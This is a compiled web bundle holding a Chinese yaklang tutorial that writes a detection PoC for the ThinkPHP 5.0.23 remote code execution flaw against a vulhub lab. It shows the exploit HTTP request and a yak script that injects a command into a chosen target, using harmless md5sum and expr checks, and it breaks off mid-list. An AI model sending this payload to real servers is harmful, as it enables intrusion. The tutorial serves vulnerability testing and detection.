"use strict";(self.webpackChunkyaklang=self.webpackChunkyaklang||[]).push([[8179],{3905:(e,t,n)=>{n.d(t,{Zo:()=>d,kt:()=>u});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var p=a.createContext({}),c=function(e){var t=a.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},d=function(e){var t=c(e.components);return a.createElement(p.Provider,{value:t},e.children)},s="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},k=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,i=e.originalType,p=e.parentName,d=l(e,["components","mdxType","originalType","parentName"]),s=c(n),k=r,u=s["".concat(p,".").concat(k)]||s[k]||m[k]||i;return n?a.createElement(u,o(o({ref:t},d),{},{components:n})):a.createElement(u,o({ref:t},d))}));function u(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var i=n.length,o=new Array(i);o[0]=k;var l={};for(var p in t)hasOwnProperty.call(t,p)&&(l[p]=t[p]);l.originalType=e,l[s]="string"==typeof e?e:r,o[1]=l;for(var c=2;c<i;c++)o[c]=n[c];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}k.displayName="MDXCreateElement"},75450:(e,t,n)=>{n.r(t),n.d(t,{contentTitle:()=>l,default:()=>m,frontMatter:()=>o,metadata:()=>p,toc:()=>c});var a=n(87462),r=(n(67294),n(3905)),i=n(63873);const o={sidebar_position:2},l="ThinkPHP 5.0.23 RCE \u626b\u63cf [YAK]",p={unversionedId:"article/best-practice/thinkphp-case",id:"article/best-practice/thinkphp-case",isDocsHomePage:!1,title:"ThinkPHP 5.0.23 RCE \u626b\u63cf [YAK]",description:"ThinkPHP\uff0c\u662f\u4e3a\u4e86\u7b80\u5316\u4f01\u4e1a\u7ea7\u5e94\u7528\u5f00\u53d1\u548c\u654f\u6377WEB\u5e94\u7528\u5f00\u53d1\u800c\u8bde\u751f\u7684\u5f00\u6e90\u8f7b\u91cf\u7ea7PHP\u6846\u67b6\u3002 \u6700\u65e9\u8bde\u751f\u4e8e2006\u5e74\u521d\uff0c2007\u5e74\u5143\u65e6\u6b63\u5f0f\u66f4\u540d\u4e3aThinkPHP\uff0c\u5e76\u4e14\u9075\u5faaApache2\u5f00\u6e90\u534f\u8bae\u53d1\u5e03\u3002 ThinkPHP\u4ece\u8bde\u751f\u4ee5\u6765\u4e00\u76f4\u79c9\u627f\u7b80\u6d01\u5b9e\u7528\u7684\u8bbe\u8ba1\u539f\u5219\uff0c\u5728\u4fdd\u6301\u51fa\u8272\u7684\u6027\u80fd\u548c\u81f3\u7b80\u7684\u4ee3\u7801\u7684\u540c\u65f6\uff0c\u4e5f\u6ce8\u91cd\u6613\u7528\u6027\u3002",source:"@site/products/article/best-practice/thinkphp-case.mdx",sourceDirName:"article/best-practice",slug:"/article/best-practice/thinkphp-case",permalink:"/products/article/best-practice/thinkphp-case",tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2},sidebar:"teamSidebar",previous:{title:"Log4j JDNI fuzz\u4e0e\u88ab\u52a8\u626b\u63cf",permalink:"/products/article/best-practice/passive-scanning"},next:{title:"ThinkPHP RCE \u88ab\u52a8\u626b\u63cf\u63d2\u4ef6 [MITM]",permalink:"/products/article/best-practice/thinkphp5-pasiveScan"}},c=[{value:"\u51c6\u5907\u5de5\u4f5c",id:"\u51c6\u5907\u5de5\u4f5c",children:[{value:"\u6f0f\u6d1e\u539f\u7406\u8be6\u89c1",id:"\u6f0f\u6d1e\u539f\u7406\u8be6\u89c1",children:[]},{value:"\u6f0f\u6d1e\u9776\u573a",id:"\u6f0f\u6d1e\u9776\u573a",children:[]}]},{value:"\u7740\u624b\u7f16\u5199 PoC",id:"\u7740\u624b\u7f16\u5199-poc",children:[{value:"Talk is Cheap, Show Me the Code;",id:"talk-is-cheap-show-me-the-code",children:[]},{value:"<code>poc.HTTP</code> \u901a\u8fc7\u6570\u636e\u5305\u6a21\u7248\u53d1\u9001\u8bf7\u6c42",id:"pochttp-\u901a\u8fc7\u6570\u636e\u5305\u6a21\u7248\u53d1\u9001\u8bf7\u6c42",children:[]},{value:"\u5982\u4f55 &quot;\u4f18\u96c5\u5730&quot; \u5224\u65ad\u7ed3\u679c\uff1f",id:"\u5982\u4f55-\u4f18\u96c5\u5730-\u5224\u65ad\u7ed3\u679c",children:[]}]},{value:"\u5236\u4f5c\u4e00\u4e2a Yakit \u63d2\u4ef6",id:"\u5236\u4f5c\u4e00\u4e2a-yakit-\u63d2\u4ef6",children:[]},{value:"\u8bfe\u540e\u4f5c\u4e1a\uff1a\u6269\u5c55",id:"\u8bfe\u540e\u4f5c\u4e1a\u6269\u5c55",children:[]}],d={toc:c},s="wrapper";function m(e){let{components:t,...o}=e;return(0,r.kt)(s,(0,a.Z)({},d,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"thinkphp-5023-rce-\u626b\u63cf-yak"},"ThinkPHP 5.0.23 RCE \u626b\u63cf ","[YAK]"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"ThinkPHP\uff0c\u662f\u4e3a\u4e86\u7b80\u5316\u4f01\u4e1a\u7ea7\u5e94\u7528\u5f00\u53d1\u548c\u654f\u6377WEB\u5e94\u7528\u5f00\u53d1\u800c\u8bde\u751f\u7684\u5f00\u6e90\u8f7b\u91cf\u7ea7PHP\u6846\u67b6\u3002 \u6700\u65e9\u8bde\u751f\u4e8e2006\u5e74\u521d\uff0c2007\u5e74\u5143\u65e6\u6b63\u5f0f\u66f4\u540d\u4e3aThinkPHP\uff0c\u5e76\u4e14\u9075\u5faaApache2\u5f00\u6e90\u534f\u8bae\u53d1\u5e03\u3002 ThinkPHP\u4ece\u8bde\u751f\u4ee5\u6765\u4e00\u76f4\u79c9\u627f\u7b80\u6d01\u5b9e\u7528\u7684\u8bbe\u8ba1\u539f\u5219\uff0c\u5728\u4fdd\u6301\u51fa\u8272\u7684\u6027\u80fd\u548c\u81f3\u7b80\u7684\u4ee3\u7801\u7684\u540c\u65f6\uff0c\u4e5f\u6ce8\u91cd\u6613\u7528\u6027\u3002")),(0,r.kt)("p",null,"ThinkPHP RCE \u662f\u4e00\u4e2a\u975e\u5e38\u7b80\u5355\u4e14\u4fbf\u6377\u7684\u53ef\u4ee5\u7528\u6765\u5236\u4f5c\u63d2\u4ef6\u7f16\u5199\u6559\u7a0b\u7684\u6f0f\u6d1e\u3002\u672c\u6587\u6211\u4eec\u5c06\u4f1a\u6bd4\u8f83\u8be6\u7ec6\u7684\u603b\u7ed3\u5728\u8fd9\u4e2a PoC \u7f16\u5199\u8fc7\u7a0b\u4e2d\u9047\u5230\u7684\u95ee\u9898\uff0c\u4e89\u53d6\u4f7f\u7528\u4e00\u4e2a\u6848\u4f8b\u5f62\u6210\u63d2\u4ef6\u7f16\u5199\u8303\u5f0f\u3002"),(0,r.kt)(i.Z,{toc:c,mdxType:"TOCInline"}),(0,r.kt)("h2",{id:"\u51c6\u5907\u5de5\u4f5c"},"\u51c6\u5907\u5de5\u4f5c"),(0,r.kt)("h3",{id:"\u6f0f\u6d1e\u539f\u7406\u8be6\u89c1"},"\u6f0f\u6d1e\u539f\u7406\u8be6\u89c1"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Reference: ",(0,r.kt)("a",{parentName:"p",href:"https://www.anquanke.com/post/id/222672"},"https://www.anquanke.com/post/id/222672"))),(0,r.kt)("h3",{id:"\u6f0f\u6d1e\u9776\u573a"},"\u6f0f\u6d1e\u9776\u573a"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"\u6ce8\u610f: \u6211\u4eec\u4f7f\u7528 ",(0,r.kt)("a",{parentName:"strong",href:"https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce"},(0,r.kt)("inlineCode",{parentName:"a"},"vulhub"),"\u4e2d ThinkPHP \u6846\u67b6\u7684\u9776\u573a\u4f5c\u4e3a\u76ee\u6807\u9776\u573a"))),(0,r.kt)("p",null,"\u901a\u8fc7\u5bf9\u9776\u573a\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u901a\u8fc7"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"git clone https://github.com/vulhub/vulhub --depth 1\ncd vulhub/thinkphp/5.0.23-rce\ndocker-compose up -d\n")),(0,r.kt)("p",null,"\u6765\u542f\u52a8\u9776\u573a\uff0c\u7136\u540e\u9605\u8bfb ",(0,r.kt)("inlineCode",{parentName:"p"},"README"),"\uff0c\u6211\u4eec\u53d1\u73b0\u4ee5\u4e0b\u6570\u636e\u5305\u662f\u5173\u952e PoC\uff1a"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",5023:!0,className:"language-http",metastring:'title="ThinkPHP 5023 PoC \u6570\u636e\u5305" {11}',title:'"ThinkPHP',PoC:!0,'\u6570\u636e\u5305"':!0,"{11}":!0},"POST /index.php?s=captcha HTTP/1.1\nHost: localhost\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\n")),(0,r.kt)("p",null,"\u6211\u4eec\u5728\u9776\u573a\u642d\u5efa\u5b8c\u6210\u540e\uff0c\u4f7f\u7528 Yakit \u89c2\u5bdf\u4fee\u6539\u4e4b\u540e\u6570\u636e\u5305\u7684\u76f8\u5173\u884c\u4e3a\u3002"),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(753).Z})),(0,r.kt)("p",null,"\u6211\u4eec\u53d1\u73b0\u627e\u5230 ",(0,r.kt)("inlineCode",{parentName:"p"},"server[REQUEST_METHOD]=id")," \u4e3a\u6267\u884c\u547d\u4ee4\u7684\u70b9\uff0c\u901a\u8fc7\u8c03\u6574\u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u770b\u5230\u6267\u884c\u7ed3\u679c\u3002"),(0,r.kt)("p",null,"\u4e3a\u4e86\u66f4\u597d\u7684\u9a8c\u8bc1\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",(0,r.kt)("inlineCode",{parentName:"p"},"expr 1 + 12312")," \u547d\u4ee4"),(0,r.kt)("div",{className:"admonition admonition-info alert alert--info"},(0,r.kt)("div",{parentName:"div",className:"admonition-heading"},(0,r.kt)("h5",{parentName:"div"},(0,r.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,r.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"14",height:"16",viewBox:"0 0 14 16"},(0,r.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"}))),"info")),(0,r.kt)("div",{parentName:"div",className:"admonition-content"},(0,r.kt)("p",{parentName:"div"},"expr \u547d\u4ee4\u662f Linux/Unix \u4e0b\u7684\u5f88\u597d\u5730\u65e0\u5bb3\u9a8c\u8bc1\u547d\u4ee4\u6267\u884c\u7684\u529e\u6cd5\u3002"),(0,r.kt)("p",{parentName:"div"},"\u5177\u4f53\u7528\u6cd5\u53ef\u4ee5\u7b80\u5355\u53c2\u8003"),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-bash"}," > expr 14 % 9\n 5\n > expr 10 + 10\n 20\n > expr 1000 + 900\n 1900\n > expr 30 / 3 / 2\n 5\n > expr 30 \\* 3   # (\u4f7f\u7528\u4e58\u53f7\u65f6\uff0c\u5fc5\u987b\u7528\u53cd\u659c\u7ebf\u5c4f\u853d\u5176\u7279\u5b9a\u542b\u4e49\u3002\u56e0\u4e3ashell\u53ef\u80fd\u4f1a\u8bef\u89e3\u663e\u793a\u661f\u53f7\u7684\u610f\u4e49)\n 90\n > expr 30 * 3\n")),(0,r.kt)("blockquote",{parentName:"div"},(0,r.kt)("ol",{parentName:"blockquote"},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("a",{parentName:"li",href:"https://www.runoob.com/linux/linux-comm-expr.html"},"https://www.runoob.com/linux/linux-comm-expr.html")),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("a",{parentName:"li",href:"https://linuxhint.com/expr-command-bash/"},"https://linuxhint.com/expr-command-bash/")))))),(0,r.kt)("p",null,"\u5f53\u7136\uff0c\u6709\u4e9b\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u540c\u6837\u65e0\u5bb3\u7684\u65b9\u5f0f\u6765\u68c0\u6d4b\u6f0f\u6d1e\u662f\u5426\u5b58\u5728"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"\u4f7f\u7528 md5sum \u7684\u547d\u4ee4 ",(0,r.kt)("inlineCode",{parentName:"li"},"echo -n 'your-string' | md5sum")),(0,r.kt)("li",{parentName:"ol"},"\u4f7f\u7528 expr \u6784\u9020\u4e00\u4e2a\u8868\u8fbe\u5f0f\u8ba9\u7cfb\u7edf\u8fd0\u7b97\uff0c\u6211\u4eec\u68c0\u6d4b\u8fd0\u7b97\u7ed3\u679c"),(0,r.kt)("li",{parentName:"ol"},"...")),(0,r.kt)("h2",{id:"\u7740\u624b\u7f16\u5199-poc"},"\u7740\u624b\u7f16\u5199 PoC"),(0,r.kt)("p",null,"\u5728 yaklang \u4e2d\uff0c\u6211\u4eec\u6709\u5f88\u591a\u529e\u6cd5\u7f16\u5199 PoC\uff0c\u9762\u5bf9\u8fd9\u79cd\u6700\u57fa\u7840\u7684\u60c5\u51b5\uff0c\u4e3a\u4e86\u548c\u4e0a\u9762\u63d0\u5230\u7684\u5185\u5bb9\u505a\u4e00\u70b9\u7167\u5e94\uff0c\u6211\u4eec\u4f7f\u7528"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"echo -n 'random-string' | md5sum")),(0,r.kt)("p",null,"\u6765\u505a\u6f0f\u6d1e\u9a8c\u8bc1\u3002"),(0,r.kt)("p",null,"\u4e3a\u6b64\u6211\u4eec\u7f16\u5199\u4e86\u6211\u4eec\u7684\u6838\u5fc3 PoC\uff0c\u4e3b\u8981\u6b65\u9aa4\u5982\u4e0b\uff1a"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"\u7f16\u5199\u6838\u5fc3\u53d1\u5305\u51fd\u6570"),(0,r.kt)("li",{parentName:"ol"},"\u83b7\u53d6\u53c2\u6570"),(0,r.kt)("li",{parentName:"ol"},"\u751f\u6210\u4e00\u4e2a cmd \u4e0e\u5bf9\u5e94\u7684 payload token"),(0,r.kt)("li",{parentName:"ol"},"\u53d1\u9001\u6570\u636e\u5305"),(0,r.kt)("li",{parentName:"ol"},"\u53d6\u51fa\u53d1\u9001\u7684\u6570\u636e\u5305\u4e2d\u7684\u7ed3\u679c\uff0c\u68c0\u6d4b\u5185\u5bb9")),(0,r.kt)("h3",{id:"talk-is-cheap-show-me-the-code"},"Talk is Cheap, Show Me the Code;"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-go"},'// echo -n \'asdfasdf\' | md5sum\nlog.setLevel("info")  // \u8bbe\u7f6e\u65e5\u5fd7\u7ea7\u522b\n\n// \u7f16\u5199\u6838\u5fc3\u53d1\u5305\u51fd\u6570\nsendPacket = func(target, cmd) {\n    return poc.HTTP(`POST /index.php?s=captcha HTTP/1.1\nHost: {{params(target)}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={{url({{params(cmd)}})}}`,\n        poc.params({\n            "cmd": cmd,\n            "target": target,\n        }),\n    )\n}\n\n// \u83b7\u53d6\u53c2\u6570\ntarget = cli.String("target")\nif target == "" {\n    die("no target")\n}\n\n// \u751f\u6210\u4e00\u4e2a cmd \u548c\u5bf9\u5e94\u7684 payload token\nrandomStr = str.RandStr(20)\nresult = codec.Md5(randomStr)\nlog.info("generate random md5 token: %v", result)\ncmd = sprintf("echo -n \'%v\' | md5sum", randomStr)\n\n// \u4f7f\u7528\u751f\u6210\u7684\u547d\u4ee4\u53d1\u5305\nrsp, _, err = sendPacket(target, cmd)\ndie(err)\n\n// \u53d6\u51fa\u53d1\u9001\u7684\u6570\u636e\u5305\u4e2d\u7684\u7ed3\u679c\uff0c\u68c0\u6d4b\u5185\u5bb9\nheaders, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)\nif str.MatchAllOfSubString(body, result) {\n    log.info("find token: %v", result)\n}\n')),(0,r.kt)("p",null,"\u7528\u6237\u53ef\u4ee5\u770b\u5230\uff0c\u5176\u5b9e\u6bcf\u4e00\u6b65\u9aa4\u8d70\u4e0b\u6765\uff0c\u975e\u5e38\u76f4\u89c2\uff0c\u6211\u4eec\u7684\u60f3\u6cd5\u5747\u53ef\u4ee5\u5f88\u7b80\u5355\u7684\u901a\u8fc7\u4e00\u4e24\u53e5\u4ee3\u7801\u6267\u884c\u6210\u4e3a\u73b0\u5b9e\u3002"),(0,r.kt)("p",null,"\u4f46\u662f\u4ee3\u7801\u4e2d\u4ecd\u7136\u6709\u4e00\u4e9b\u7ec6\u8282\uff0c\u7528\u6237\u53ef\u80fd\u4e00\u77e5\u534a\u89e3\u3002\u6211\u4eec\u63a5\u4e0b\u6765\u9488\u5bf9\u4ee3\u7801\u4e2d\u7684\u5185\u5bb9\u505a\u66f4\u8be6\u7ec6\u7684\u89e3\u91ca"),(0,r.kt)("h3",{id:"pochttp-\u901a\u8fc7\u6570\u636e\u5305\u6a21\u7248\u53d1\u9001\u8bf7\u6c42"},(0,r.kt)("inlineCode",{parentName:"h3"},"poc.HTTP")," \u901a\u8fc7\u6570\u636e\u5305\u6a21\u7248\u53d1\u9001\u8bf7\u6c42"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"poc.HTTP")," \u662f\u4e00\u4e2a\u4e3a PoC \u68c0\u6d4b\u573a\u666f\u800c\u751f\u7684\u7279\u6b8a HTTP \u5e93\uff0c\u4ed6\u7684\u4e3b\u6253\u5e76\u4e0d\u662f\u4e3a\u5f00\u53d1\u5b8c\u6574\u652f\u6301 HTTP \u8bf7\u6c42\uff0c\u800c\u662f\u76f4\u63a5\u64cd\u4f5c\u5e95\u5c42\u5957\u63a5\u5b57\uff0c\u81ea\u5df1\u5b9e\u73b0\u4e86 proxy \u4e0e response \u7684\u5404\u79cd\u54cd\u5e94\u64cd\u4f5c\u3002\u4e3a\u7528\u6237\u63d0\u4f9b\u6700\u539f\u6c41\u539f\u5473\u7684\u6570\u636e\u5305\u5c42\u9762\u7684\u4ea4\u4e92\u4f53\u9a8c\u3002"),(0,r.kt)("p",null,"\u5f53\u7136\u4ea4\u4e92\u5c31\u8981\u6d89\u53ca\u5230\u53c2\u6570\u7684\u4f20\u9012\u4e0e\u6e32\u67d3\u3002"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"poc.HTTP")," \u539f\u751f\u652f\u6301 ",(0,r.kt)("inlineCode",{parentName:"p"},"yak.fuzz")," \u8bed\u6cd5\uff0c\u540c\u65f6\u4e5f\u652f\u6301\u53c2\u6570\u6269\u5c55\u8bed\u6cd5\uff08\u672c\u8d28\u4e0a\u4e5f\u662f\u4e00\u79cd ",(0,r.kt)("inlineCode",{parentName:"p"},"yak.fuzz")," \u8bed\u6cd5\uff09\u3002"),(0,r.kt)("p",null,"\u6211\u4eec\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u5c31\u540c\u65f6\u4f7f\u7528\u4e86 ",(0,r.kt)("inlineCode",{parentName:"p"},"yak.fuzz")," \u7684\u7f16\u7801\u8bed\u6cd5\u4e0e\u53c2\u6570\u6269\u5c55\u8bed\u6cd5\u3002"),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(87522).Z})),(0,r.kt)("p",null,"\u6211\u4eec\u4f7f\u7528\u7ea2\u8272\u65b9\u6846\u6807\u6ce8\u4e86\u4e24\u4e2a\u5757\u513f"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"{{params(target)}}")," \u8fd9\u4e2a\u5757\u513f\u7684\u610f\u601d\u662f\uff0c\u6e32\u67d3\u4e00\u4e2a\u53c2\u6570\uff0c\u53c2\u6570\u540d\u4e3a target\uff0c\u8fd9\u4e2a\u53c2\u6570\u901a\u8fc7 ",(0,r.kt)("inlineCode",{parentName:"li"},'poc.params({"target": "your-target"})')," \u4f20\u5165\u3002"),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"{{url({{params(cmd)}})}}")," \u5176\u5b9e\u6c1b\u56f4\u4e24\u90e8\u5206\uff1a",(0,r.kt)("inlineCode",{parentName:"li"},"{{params(cmd)}}")," \u548c ",(0,r.kt)("inlineCode",{parentName:"li"},"{{url(...)}}"),"\uff1a",(0,r.kt)("ol",{parentName:"li"},(0,r.kt)("li",{parentName:"ol"},"\u5f53\u7136 ",(0,r.kt)("inlineCode",{parentName:"li"},"{{params(cmd)}}")," \u6211\u4eec\u5df2\u7ecf\u5f88\u719f\u6089\u4e86\uff0c\u610f\u601d\u662f\u6e32\u67d3 ",(0,r.kt)("inlineCode",{parentName:"li"},"cmd")," \u53c2\u6570;"),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"{{url(...)}}"),' \u7684\u610f\u601d\u662f "\u628a\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u8fdb\u884c URL \u7f16\u7801"\u3002')))),(0,r.kt)("div",{className:"admonition admonition-info alert alert--info"},(0,r.kt)("div",{parentName:"div",className:"admonition-heading"},(0,r.kt)("h5",{parentName:"div"},(0,r.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,r.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"14",height:"16",viewBox:"0 0 14 16"},(0,r.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"}))),"\u53c2\u8003\u8d44\u6599 ",(0,r.kt)("inlineCode",{parentName:"h5"},"yak.fuzz"))),(0,r.kt)("div",{parentName:"div",className:"admonition-content"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("inlineCode",{parentName:"p"},"yaklang.io")," \u5728 ",(0,r.kt)("inlineCode",{parentName:"p"},"fuzz")," \u6a21\u5757\u7684\u76f8\u5173\u6559\u7a0b\u6709\u4e09\u7bc7\uff0c\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003"),(0,r.kt)("ol",{parentName:"div"},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("a",{parentName:"li",href:"/docs/newforyak/fuzz_tutorial"},"yak.fuzz \u57fa\u7840\u6559\u7a0b")),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("a",{parentName:"li",href:"/docs/newforyak/fuzz_for_more"},"yak.fuzz \u9ad8\u7ea7\u6559\u7a0b")),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("a",{parentName:"li",href:"/docs/buildinlibs/lib_fuzz"},"yak.fuzz \u8bed\u6cd5\u4e0e\u63a5\u53e3\u64cd\u4f5c\u624b\u518c"))))),(0,r.kt)("p",null,"\u5927\u5bb6\u5728\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u8981\u6ce8\u610f\u7684\u5730\u65b9\u662f\u7f16\u7801\u95ee\u9898\uff0c\u4f8b\u5982\u6848\u4f8b\u4e2d\u6211\u4eec\u7684\u6570\u636e\u5305\u6ce8\u5165\u547d\u4ee4\u7684\u4f4d\u7f6e\u5728 ",(0,r.kt)("inlineCode",{parentName:"p"},"POST")," \u7684\u53c2\u6570\u4e2d\u3002"),(0,r.kt)("p",null,"\u8fd9\u91cc\u8981\u6c42\u88ab URL \u7f16\u7801\uff0c\u6240\u4ee5\u6211\u4eec\u542f\u7528 ",(0,r.kt)("inlineCode",{parentName:"p"},"{{url(...)}}")," \u7684 ",(0,r.kt)("inlineCode",{parentName:"p"},"yak.fuzz")," \u8bed\u6cd5\u8fdb\u884c\u7f16\u7801\u3002"),(0,r.kt)("p",null,"\u5f53\u7136\uff0c\u89e3\u51b3\u65b9\u6848\u5e76\u4e0d\u53ea\u6709\u4e00\u79cd\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0d\u7528 ",(0,r.kt)("inlineCode",{parentName:"p"},"{{url(...)}}"),"\u3002\u5728 ",(0,r.kt)("inlineCode",{parentName:"p"},'poc.params({"cmd": codec.EncodeUrl(cmd)})')," \u4e2d\uff0c\u4f7f\u7528 ",(0,r.kt)("inlineCode",{parentName:"p"},"codec.EncodeUrl")," \u4e5f\u540c\u6837\u53ef\u4ee5\u8fbe\u5230\u540c\u6837\u6548\u679c"),(0,r.kt)("div",{className:"admonition admonition-info alert alert--info"},(0,r.kt)("div",{parentName:"div",className:"admonition-heading"},(0,r.kt)("h5",{parentName:"div"},(0,r.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,r.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"14",height:"16",viewBox:"0 0 14 16"},(0,r.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"}))),"yak.codec \u6a21\u5757")),(0,r.kt)("div",{parentName:"div",className:"admonition-content"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("inlineCode",{parentName:"p"},"codec")," \u662f ",(0,r.kt)("inlineCode",{parentName:"p"},"yaklang.io")," \u8fdb\u884c\u7f16\u7801\u4e0e\u89e3\u7801\uff0c\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u7684\u8f85\u52a9\u6a21\u5757\uff0c\u53ef\u4ee5\u53c2\u8003 ",(0,r.kt)("a",{parentName:"p",href:"/docs/api/codec"},"yak.codec \u63a5\u53e3\u624b\u518c"),"\u3002"))),(0,r.kt)("h3",{id:"\u5982\u4f55-\u4f18\u96c5\u5730-\u5224\u65ad\u7ed3\u679c"},'\u5982\u4f55 "\u4f18\u96c5\u5730" \u5224\u65ad\u7ed3\u679c\uff1f'),(0,r.kt)("p",null,'\u6309\u7167\u7ecf\u9a8c\u6765\u8bf4\uff0c\u7edd\u5927\u90e8\u5206\u666e\u901a\u6f0f\u6d1e\u7684\u5224\u65ad\u903b\u8f91\u53ef\u4ee5\u5206\u4e3a "\u4e0e / \u6216" \u903b\u8f91\u3002'),(0,r.kt)("p",null,"\u6240\u4ee5\uff0c\u6211\u4eec\u5728 ",(0,r.kt)("inlineCode",{parentName:"p"},"str")," \u6a21\u5757\u4e2d\u4e3a\u5927\u5bb6\u51c6\u5907\u4e86\u4e24\u5957\u51fd\u6570\u53ef\u4ee5\u5f88\u597d\u8986\u76d6\u8fd9\u79cd\u573a\u666f"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"str.MatchAllOfSubString/Regexp/Glob")," \u5224\u65ad\u4e00\u6bb5\u6570\u636e\u4e2d\u662f\u5426\u90fd\u6ee1\u8db3\u540e\u9762\u7684\u89c4\u5219\u3002"),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("inlineCode",{parentName:"li"},"str.MatchAnyOfSubString/Regexp/Glob")," 